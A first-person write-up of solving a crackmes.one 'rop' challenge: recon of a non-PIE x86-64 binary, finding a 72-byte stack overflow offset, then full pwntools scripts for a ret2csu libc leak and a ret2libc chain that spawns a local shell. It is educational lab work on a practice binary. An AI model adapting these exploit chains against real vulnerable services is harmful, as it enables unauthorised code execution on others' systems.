# ROP write up
This exploit was provided by BitFriends on crackmes.one https://crackmes.one/crackme/5f3d7ed033c5d42a7c667d95

## Context
This is very exciting as it's my first time doing any type of buffer overflow myself from scratch. I'd like to thank BitFriends in advance for uploading a binary that serves as a low entry introduction. My I had to learn almost all of it as I only undestood buffer overflows from a theoretical standpoint. Because of this, I decided to include some of my learning process in this write up.

## Recon
```
/Projects/RE/crackmes.one/rop
❯ file ./rop
./rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f950fa8cc1c799a905ae42eaade36fce8f60ac61, not stripped

~/Projects/RE/crackmes.one/rop
❯ checksec ./rop
[*] '/home/edoardo/Projects/RE/crackmes.one/rop/rop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

As the challenge it self is called 'rop' I start out searching "rop exploit" online, and learn it stands for Return Oriented Programming. Supposedly, an attacker using this technique would be able to hijack a programs control flow and execute instructions already present in the machines memory. These instructions are refered to as gadgets. This to me sounds like some type of buffer overflow so let's run it and see if it takes any type of input.
```
~/Projects/RE/crackmes.one/rop
❯ ./rop
Input: test
Hello World!
```
So it takes a stdin, and doesn't seem to do anything with it. Let's see the Assembly in Ghidra. This is a very simple program so I'll show the whole thing:
```
        00400537 55              PUSH       RBP

        00400538 48 89 e5        MOV        RBP,RSP

        0040053b ba 07 00        MOV        EDX,0x7
                 00 00
        00400540 48 8d 35        LEA        RSI,[s_Input:_00400634]                          = "Input: "
                 ed 00 00 00
        00400547 bf 01 00        MOV        EDI,0x1
                 00 00
        0040054c b8 00 00        MOV        EAX,0x0
                 00 00
        00400551 e8 da fe        CALL       <EXTERNAL>::write                                ssize_t write(int __fd, void * _
                 ff ff
        00400556 b8 00 00        MOV        EAX,0x0
                 00 00
        0040055b e8 22 00        CALL       input                                            undefined input()
                 00 00
        00400560 ba 0d 00        MOV        EDX,0xd
                 00 00
        00400565 48 8d 35        LEA        RSI,[s_Hello_World!_0040063c]                    = "Hello World!\n"
                 d0 00 00 00
        0040056c bf 01 00        MOV        EDI,0x1
                 00 00
        00400571 b8 00 00        MOV        EAX,0x0
                 00 00
        00400576 e8 b5 fe        CALL       <EXTERNAL>::write                                ssize_t write(int __fd, void * _
                 ff ff
        0040057b b8 00 00        MOV        EAX,0x0
                 00 00
        00400580 5d              POP        RBP
        00400581 c3              RET
```

All that happens here is write string, call `input()`, write string. Nothing here. Let's check `input()`.
```
        00400582 55              PUSH       RBP
        00400583 48 89 e5        MOV        RBP,RSP
        00400586 48 83 ec 40     SUB        RSP,0x40
        0040058a 48 8d 45 c0     LEA        RAX=>local_48,[RBP + -0x40]
        0040058e ba 80 02        MOV        EDX,0x280
                 00 00
        00400593 48 89 c6        MOV        RSI,RAX
        00400596 bf 00 00        MOV        EDI,0x0
                 00 00
        0040059b b8 00 00        MOV        EAX,0x0
                 00 00
        004005a0 e8 9b fe        CALL       <EXTERNAL>::read                                 ssize_t read(int __fd, void * __
                 ff ff
        004005a5 90              NOP
        004005a6 c9              LEAVE
        004005a7 c3              RET
```
Right here, seems to be where the likely overflow happens.

### Program Assumptions
This program's logic and it was written with a couple of assumptions during it's use.
1. It assumes all input is equal or lower to 64 bytes.
2. It assumes after input is taken, the program will exit right away.
3. It assumes given input will be completely valid, as it does no input validation whatsoever.

### Vulnerability Enumeration
I know that if we want to overflow anything, in theory, we have to give it more bytes of data than it reserved for the input buffer. Local_48 here is the input buffer, which has `0x40` aka 64 bytes. But, the `read()` has `0x280 as it's third argument. In the libc documentation it mentions that that's the maximum input that can be taken. `0x280` to decimal is `(2 * 16^2) + (8 * 16^1)` = 640. So, it takes 640 bytes of maximum input. This seems tailor fit for exploitation!

To start exploiting this vulnerability I first need to find the offset of the return adress of the current function. This way we can take over the control flow of the program. The stack should generally look like this:
```
[  64 bytes: local_48 buffer  ]
[   8 bytes: saved RBP        ]
[   8 bytes: return address   ]
```
So 72 bytes (64 buffer + 8 saved RBP) for our overflow, and the actual exploit payload starts at 73, I expect. Now, as the last part of the recon, I need to confirm this expectation empirically. An elegant way of doing it is by running:
```
gdb ./rop
(gdb) run < <(python3 -c "print('A'*72 + 'B'*8)")

// After the crash

(gdb) x/gx $rsp
```
But on this system I run fish shell which doesn't support `<(` So I have to write it do a file first:
```
~/Projects/RE/crackmes.one/rop
❯ python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'B'*8)" > /tmp/payload.bin

~/Projects/RE/crackmes.one/rop
❯ gdb ./rop
(gdb) run < /tmp/payload.bin
Starting program: /home/edoardo/Projects/RE/crackmes.one/rop/rop < /tmp/payload.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Input: 
Program received signal SIGSEGV, Segmentation fault.
0x00000000004005a7 in input ()
=> 0x00000000004005a7 <input+37>:       c3                      ret
(gdb) x/gx $rsp
0x7fffffffdfd8: 0x4242424242424242
```
This proves the suspision to be correct; 72 bytes of A's in paddding and the next 8 B's fall perfectly on the next byte.

## Exploitation

In this scenario, I have three options:
* ret2plt — call system@plt if it's linked, passing /bin/sh
* ret2libc — leak a libc address, calculate system and /bin/sh offsets, then call them
* syscall ROP — set up registers manually and call execve via syscall number 59

To go for ret2plt `system` and `/bin/sh` have to be present already.

```
~/Projects/RE/crackmes.one/rop
❯ objdump -d ./rop | grep -i system
```
No results, so it's likely ret2libc. In order to properly perform ret2libc I need to leak the *runtime* libc address, calculate `system` and `/bin/sh` from it, use those to call the full `system("/bin/sh") to spawn the a shell. To leak the libc address itself we can call `write(1, write_got, 8)` to print the GOT entry of `write()`. This will contain the libc runtime addres *offset* by `write()`. Simply substracting `write()`'s offset will reveal the libc base address. In order to construct this call, it requires setting of three registers: `RDI`, `RSI`, and `RDX`. So let's start off by looking for these. If we can't find proper gadgets for these registers, we'll have to resort to ret2csu, which should be possible since it's non-PIE.

### Leaking libc
This program's size 

```
~/Projects/RE/crackmes.one/rop
❯ ROPgadget --binary ./rop | grep "pop rdi"
  ROPgadget --binary ./rop | grep "pop rsi"
  ROPgadget --binary ./rop | grep "pop rdx"
0x0000000000400613 : pop rdi ; ret
0x0000000000400611 : pop rsi ; pop r15 ; ret
```
I have here a `pop rdi ; ret` and `pop rsi ; pop r15 ; ret`, but no `pop rdx` gadget. Earlier I confirmed in GDB that RDX is 0 at the time of the ret, meaning write would print nothing. So ret2csu seems our next best strategy to find our gadgets and leak the libc address. By using `objdump` I can look for `"__libc_csu_init"` and search it for potential gadgets:
```
~/Projects/RE/crackmes.one/rop
❯ objdump -d ./rop | grep -A 30 "__libc_csu_init"
00000000004005b0 <__libc_csu_init>:
  4005b0:       41 57                   push   %r15
  4005b2:       41 56                   push   %r14
  4005b4:       49 89 d7                mov    %rdx,%r15
  4005b7:       41 55                   push   %r13
  4005b9:       41 54                   push   %r12
  4005bb:       4c 8d 25 4e 08 20 00    lea    0x20084e(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
  4005c2:       55                      push   %rbp
  4005c3:       48 8d 2d 4e 08 20 00    lea    0x20084e(%rip),%rbp        # 600e18 <__do_global_dtors_aux_fini_array_entry>
  4005ca:       53                      push   %rbx
  4005cb:       41 89 fd                mov    %edi,%r13d
  4005ce:       49 89 f6                mov    %rsi,%r14
  4005d1:       4c 29 e5                sub    %r12,%rbp
  4005d4:       48 83 ec 08             sub    $0x8,%rsp
  4005d8:       48 c1 fd 03             sar    $0x3,%rbp
  4005dc:       e8 1f fe ff ff          call   400400 <_init>
  4005e1:       48 85 ed                test   %rbp,%rbp
  4005e4:       74 20                   je     400606 <__libc_csu_init+0x56>
  4005e6:       31 db                   xor    %ebx,%ebx
  4005e8:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
  4005ef:       00 
  4005f0:       4c 89 fa                mov    %r15,%rdx
  4005f3:       4c 89 f6                mov    %r14,%rsi
  4005f6:       44 89 ef                mov    %r13d,%edi
  4005f9:       41 ff 14 dc             call   *(%r12,%rbx,8)
  4005fd:       48 83 c3 01             add    $0x1,%rbx
  400601:       48 39 dd                cmp    %rbx,%rbp
  400604:       75 ea                   jne    4005f0 <__libc_csu_init+0x40>
  400606:       48 83 c4 08             add    $0x8,%rsp
  40060a:       5b                      pop    %rbx
  40060b:       5d                      pop    %rbp
  40060c:       41 5c                   pop    %r12
  40060e:       41 5d                   pop    %r13
  400610:       41 5e                   pop    %r14
  400612:       41 5f                   pop    %r15
  400614:       c3                      ret
  400615:       90                      nop
  400616:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  40061d:       00 00 00 

0000000000400620 <__libc_csu_fini>:
  400620:       f3 c3                   repz ret

Disassembly of section .fini:

0000000000400624 <_fini>:
  400624:       48 83 ec 08             sub    $0x8,%rsp
  400628:       48 83 c4 08             add    $0x8,%rsp
  40062c:       c3                      ret

```
Hiding in here are 2 beautiful gadgets, at address `0x40060a` and `0x4005f0` respectively. Giving us the reusable pieces of code:
```
// Gadget 1 at 0x40060a
pop    %rbx
pop    %rbp
pop    %r12
pop    %r13
pop    %r14
pop    %r15
ret

// Gadget 2 at 0x4005f0
mov    %r15,%rdx
mov    %r14,%rsi
mov    %r13d,%edi
call   *(%r12,%rbx,8)
```
To leak the libc address, I set up a python script that to automate the process. Later I will likely need this script for the full exploit.
```Python
from pwn import *

elf = ELF('./rop')
p = process('./rop')

gadget1     = 0x40060a
rbx_value   = 0x00
rbp_value   = 0x01
r12_value   = 0x601018
r13_value   = 0x01
r14_value   = 0x601018
r15_value   = 0x08
gadget2     = 0x4005f0
main        = 0x400537

payload  = b'A' * 72
payload += p64(gadget1)
payload += p64(rbx_value)
payload += p64(rbp_value)
payload += p64(r12_value)
payload += p64(r13_value)
payload += p64(r14_value)
payload += p64(r15_value)
payload += p64(gadget2)
payload += b'B' * 56
payload += p64(main)

p.sendline(payload)
p.recvuntil(b'Input: ')   # eat first prompt

# Read raw bytes, don't stop at null
leaked = p.recv(8, timeout=1)
print(f"Leaked ({len(leaked)} bytes): {leaked.hex()}")
```
After gadget 2's call returns, __libc_csu_init executes another pop sequence before its own ret. That's 7 × 8 = 56 bytes of padding needed to absorb it before the next gadget. 
For my leak script, I used both gadgets. Gadget 1 at `0x40060a` to load the registers via the pop sequence, and gadget 2 at 0x4005f0 to execute the call. These are the results:
```
~/Projects/RE/crackmes.one/rop
❯ python leak.py
[*] '/home/edoardo/Projects/RE/crackmes.one/rop/rop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process './rop': pid 23912
Leaked (8 bytes): e0ddd07f027f0000
[*] Stopped process './rop' (pid 23912)
```
Now that is the leaked value, but we need to translate these raw bytes to a real usable address. For that I made another little script.
```
from pwn import *
leaked = bytes.fromhex('e0ddd07f027f0000')
write_libc = u64(leaked)
print(hex(write_libc))

~/Projects/RE/crackmes.one/rop
❯ python translate_libc.py
0x7f027fd0dde0
```
Amazing! Our libc address is `0x7f027fd0dde0`! Now, this only proves our exploit so far works, because this address is different every runtime as libc does not live inside our binary. Because of this, the entire script will have to be a single big exploit doing all steps at once. Every function inside of libc lives at a fixed offset of our libc address, which never changes within a given libc version.
```
~/Projects/RE/crackmes.one/rop
❯ ldd ./rop
        linux-vdso.so.1 (0x00007f77bda05000)
        libc.so.6 => /usr/lib/libc.so.6 (0x00007f77bd600000)
        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f77bda07000)
```
Since we leaked libc by the use of `write()` we need to know the offset of that function as well, eventhough we won't use it for exploitation itself. This is because our libc address is currently as it were 'contaminated' with the `write()` offset and has to be subtracted in our script.
```
~/Projects/RE/crackmes.one/rop
❯ readelf -s /usr/lib/libc.so.6 | grep -E " write@@| system@@"
  1064: 0000000000053b00    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
  2976: 000000000010dde0    32 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5

~/Projects/RE/crackmes.one/rop
❯ strings -t x /usr/lib/libc.so.6 | grep "/bin/sh"
 1b01aa /bin/sh
```
Additionally, to finish the exploit properly, we also need an extra `ret` to get 16 byte alignment. Internally `system()` uses movaps, an SSE instruction that segfaults if RSP isn't 16-byte aligned at the moment of the call. I found a really clean single `ret` with `ROPgadget` that's perfect for this usecase.
```
~/Projects/RE/crackmes.one/rop
❯ ROPgadget --binary ./rop | grep ": ret"
0x0000000000400416 : ret
```
Now that we have everything, it's time to stitch the whole script into one single exploit, and spawn that shell.
```Python
from pwn import *

elf = ELF('./rop')
p = process('./rop')

# libc leaking
gadget1     = 0x40060a
rbx_value   = 0x00
rbp_value   = 0x01
r12_value   = 0x601018
r13_value   = 0x01
r14_value   = 0x601018
r15_value   = 0x08
gadget2     = 0x4005f0
main        = 0x400537

payload  = b'A' * 72
payload += p64(gadget1)
payload += p64(rbx_value)
payload += p64(rbp_value)
payload += p64(r12_value)
payload += p64(r13_value)
payload += p64(r14_value)
payload += p64(r15_value)
payload += p64(gadget2)
payload += b'B' * 56
payload += p64(main)

p.sendline(payload)
p.recvuntil(b'Input: ')   # eat first prompt

leaked = p.recv(8, timeout=1)
write_libc = u64(leaked)
print(f"leaked libc address: {hex(write_libc)}")

# shell calling
lib_base    = write_libc - 0x10dde0 # leak libc base with write so subtract write offset to get base
pop_rdi_ret = 0x400613
bin_sh      = lib_base + 0x1b01aa
system      = lib_base + 0x053b00
ret         = 0x400416

payload  = b'A' * 72
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.recvuntil(b'Input: ')   # eat second prompt
p.sendline(payload)
p.interactive()
```
Running this script will give us the final solution to this challenge and, of course, interactive shell:
```
~/Projects/RE/crackmes.one/rop
❯ python exploit.py
[*] '/home/edoardo/Projects/RE/crackmes.one/rop/rop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process './rop': pid 57140
leaked libc address: 0x7fa32ed0dde0
[*] Switching to interactive mode
$ whoami
edoardo
```

## Conclusion
The goal of this challenge was perform a stack-based buffer overflow attack on this binary and spawn a shell. This I achieved by with ret2libc exploit supplemented with a ret2csu. I think this was a wonderful challenge and I learned a whole lot. Thanks again to BitFriends for uploading this great binary.
